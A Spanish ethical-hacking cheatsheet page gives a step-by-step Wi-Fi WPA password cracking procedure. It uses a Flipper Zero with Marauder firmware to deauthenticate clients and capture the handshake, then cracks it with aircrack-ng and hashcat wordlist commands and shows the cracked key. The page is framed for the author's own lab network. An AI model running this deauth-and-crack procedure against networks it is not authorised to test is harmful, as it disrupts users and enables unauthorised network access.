
# Wifi Password Cracking

## <mark style="color:orange;">Wifi Cracking</mark> <a href="#mifss" id="mifss"></a>

Vamos a ver el proceso completo de cracking de una contraseña Wifi. Los pasos a seguir para ello son los siguientes:

1. Tener instalado el [Firmware Marauder](/ethical-hacking-cheatsheet/hardware-hacking/flipper-zero/gpio-y-modulos/marauder-firmware.md)
2. Escanear los APs para encontrar el objetivo
3. Seleccionar el ID del AP objetivo
4. Seleccionar Sniff > Raw
5. Ejecutar ataque deauth
6. Descargar el archivo .pcap desde qFlipper
7. Limpiar el archivo .pcap con Wireshark filtrando por `eapol`
8. Guardar archivo pcap nuevo solo con el handshake
9. Crackear el .pcap con aircrack-ng o hashcat

## <mark style="color:orange;">1. Escanear APs</mark>

Una vez que tenemos Marauder instalado podemos escanear redes de la siguiente manera:

1. Vamos a `GPIO > ESP > Wifi Marauder`

<figure><img src="/files/SzHpcqU50YheCvJdhQqa" alt=""><figcaption></figcaption></figure>

2. Seleccionamos `Scan ap`

{% hint style="info" %}
Podemos cambiar `ap` a `station` para escanear dispositivos conectados a las redes.
{% endhint %}

<figure><img src="/files/0Va79NHyva51xktWTqHq" alt=""><figcaption></figcaption></figure>

3. Le damos y empieza a escanear todas las redes Wifi cercanas. Esto nos servirá para identificar la red objetivo:

<figure><img src="/files/FTecKRDWgDyWjUr3TQDs" alt=""><figcaption></figcaption></figure>

## <mark style="color:orange;">2. Ver listado de APs</mark>

Si vamos al apartado `List` y seleccionamos `ap` vemos un listado en detalle del nombre de los APs disponibles, con un número asociado. Este número nos servirá para configurar el ataque Deauth.

<div><figure><img src="/files/Cv8bKokggUFqBKx41qOY" alt=""><figcaption></figcaption></figure> <figure><img src="/files/MvqUULXYdODKzVA2bnJx" alt=""><figcaption></figcaption></figure></div>

En nuestro caso, el objetivo será la red `INHACKEABLE`  con el `ID 1`. Vosotros podéis configurar una red Wifi vulnerable para seguir estas secciones desde los ajustes de vuestro router.

## <mark style="color:orange;">3. Seleccionar el AP objetivo</mark>

Le damos a `Select > ap` e introducimos el ID de la red objetivo, en nuestro caso el `1`, que se corresponde con la red `INHACKEABLE`.

<div><figure><img src="/files/KUr7ItGuH7qDoLyjw6o5" alt=""><figcaption></figcaption></figure> <figure><img src="/files/QNSuJBxRb8B21qMIP2Q2" alt=""><figcaption></figcaption></figure></div>

## <mark style="color:orange;">4. Habilitar Sniff Raw</mark>

En el apartado `Sniff` seleccionamos la opción `raw`. Esto permitirá recopilar toda la información de los ataques wifi en bruto.

<figure><img src="/files/RAyfmsMGoYv2WP8Vh7tG" alt=""><figcaption></figcaption></figure>

## <mark style="color:orange;">5. Ataque Deauth</mark>

Una vez configurados todos los pasos anteriores seleccionamos la opción `Attack > deauth`, lo que desconectará todos los dispositivos de la red objetivo. Esto sirve para capturar el handshake, que es la contraseña de la red wifi cifrada.

<div><figure><img src="/files/7jtqE8zt1vocjakd6hzA" alt=""><figcaption></figcaption></figure> <figure><img src="/files/2yAYoNxX6pT5miyHtxm8" alt=""><figcaption></figcaption></figure></div>

Una vez que empieza el ataque deauth (en cuanto se desconecte un dispositivo), vamos para atrás rápidamente y pulsamos sobre la opción `Sniff > raw` que ya teníamos configurada para que se genere el archivo .pcap en la ruta:

```
SD Card > app_data > marauder > pcaps
```

<figure><img src="/files/iTFh5R1vCK6mb6fMx4FP" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Este archivo tiene multitud de datos en bruto, por lo que necesitamos "limpiarlo" para dejar solamente el handshake y poder crackearlo fácilmente (si tiene una contraseña débil).
{% endhint %}

## <mark style="color:orange;">6. Limpiar el pcap con Wireshark</mark>

Vamos a limpiar el archivo .pcap con Wireshark. Para ello debemos importar el archivo pcap en Wireshark, filtrando por `eapol`. Para ello podemos arrastrar el archivo a la interfaz o abriéndolo desde File:

<figure><img src="/files/qyPGJZejVCJo9JIFjqym" alt=""><figcaption></figcaption></figure>

Al aplicar el filtrado por `eapol` veremos 4 mensajes. Estas son las 4 partes del `4 Way Handshake`, utilizado en redes modernas para encriptar la contraseña en plano.

{% hint style="warning" %}
**Importante**: El pcap debe contener los 4 de 4 mensajes, ya que son las partes del handshake. Si no lo conseguimos a la primera debemos repetir el proceso hasta que tengamos todas las partes o no funcionará el cracking. Estas partes se generan cuando el dispositivo conectado a la red se expulsa y se vuelve a conectar automáticamente.
{% endhint %}

Una vez filtrado le damos a `File > Save as` y le ponemos el nombre que queramos, como `handshake.pcap`.

## <mark style="color:orange;">7. Crackeo de handshake con Aircrack-ng</mark>

La manera más simple de crackear un handshake es utilizando Aircrack-ng en Kali Linux, aunque también podríamos usar hashcat.

Para este ejemplo podríamos crear un archivo que contenga el password de la red. También podríamos utilizar distintos diccionarios como las [SecList](https://github.com/danielmiessler/SecLists), el diccionario Rockyou, o crear nuestro propio diccionario con crunch por ejemplo.

{% content-ref url="/pages/pmdktnDe2dem7TOabJmf" %}
[Diccionarios Custom](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/diccionarios-custom.md)
{% endcontent-ref %}

```bash
nano pass.txt

1234
12345t
4567
34567
34567
09876
654
7654
223456
87654
4567
2343456
Passw0rd123
```

```bash
# Con rockyou
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt *.pcap 

# Diccionario de contraseñas default en routers
sudo aircrack-ng -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt *.pcap

# Con pass.txt
sudo aircrack-ng -w pass.txt handshake.pcap 
```

### Utilizando Rockyou

Debemos descomprimir el diccionario Rockyou antes de utilizarlo con el comando:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Luego usamos aircrack-ng para empezar el proceso de cracking

```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt *.pcap

Reading packets, please wait...
Opening handshake.pcap
Opening sniffraw_2.pcap
Read 884 packets.

   #  BSSID              ESSID                     Encryption

   1  58:76:AC:02:2B:28  vodafoneBA2185            Unknown
   2  E4:66:AB:4C:31:EA  DIGIFIBRA-Z5RR            WPA (0 handshake)
   3  EA:66:AB:4C:31:EA  INHACKEABLE               WPA (1 handshake)
   4  F8:0D:A9:9F:A4:D1  DIGIFIBRA-D677            Unknown

Index number of target network ? 3

Reading packets, please wait...
Opening handshake.pcap
Opening sniffraw_2.pcap
```

```
      [00:01:56] 2049488/14344392 keys tested (17762.08 k/s) 

      Time left: 11 minutes, 32 seconds                         14.29%

                          KEY FOUND! [ Passw0rd123 ]


      Master Key     : 4B 83 63 7A 3F E0 DD 17 E9 42 7A 46 CC 16 E1 98 
                       05 16 F6 3D BC B9 4A 5D 65 B0 13 67 C7 A0 DB 8F 

      Transient Key  : 78 E4 58 5E EB AF 11 9E 29 E6 3D 6E B7 F2 46 B3 
                       FA BA 91 8E CC 6F 79 DF F6 A3 24 47 01 38 E1 18 
                       79 58 2D 22 A5 E5 F2 13 6E F7 05 B6 4D 67 6F 48 
                       70 68 3A EE 57 EB 14 2E 38 B2 70 6B 46 63 07 D2 

      EAPOL HMAC     : 6D 1D 58 AD 5D BC B7 93 62 B9 5C 41 20 E2 77 28 
```

El cracking funciona correctamente y obtenemos la contraseña en plano: `Passw0rd123`

## <mark style="color:orange;">8. Cracking con Hashcat</mark>

Lo bueno de utilizar este método es que podemos usar toda la potencia de la GPU para crackear un handshake. Para poder crackear archivos .pcap con hashcat debemos convertirlo a un formato que admita hashcat. Para ello podemos usar la siguiente herramienta que nos proporciona el propio hashcat:

{% embed url="<https://hashcat.net/cap2hashcat/>" %}

Una vez convertido nos generará un archivo con extensión `.hc22000`. Este archivo lo podemos crackear fácilmente utilizando el modo `-m 22000`:

```bash
hashcat -m 22000 -d 1 handshake.hc22000 wordlist
```

```bash
# Con rockyou
hashcat -m 22000 -d 1 --status handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Con ciccionario de contraseñas default en routers
hashcat -m 22000 -d 1 --status handshake.hc22000 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
```

#### **Explicación de los Parámetros**

* **`-m 22000`** → Especifica que el hash es del tipo `WPA-PMKID+EAPOL.`
* **`-d 1`** → Usa la GPU con índice `1`. Verifica con `hashcat -I` si esto es correcto para tu sistema.
* **`--status`** → Muestra el progreso del ataque en tiempo real.
* **`handshake.hc22000`** → Archivo convertido a formato Hashcat desde un `.cap` usando `hcxpcapngtool`.
* **Diccionario** → Define la lista de contraseñas a probar
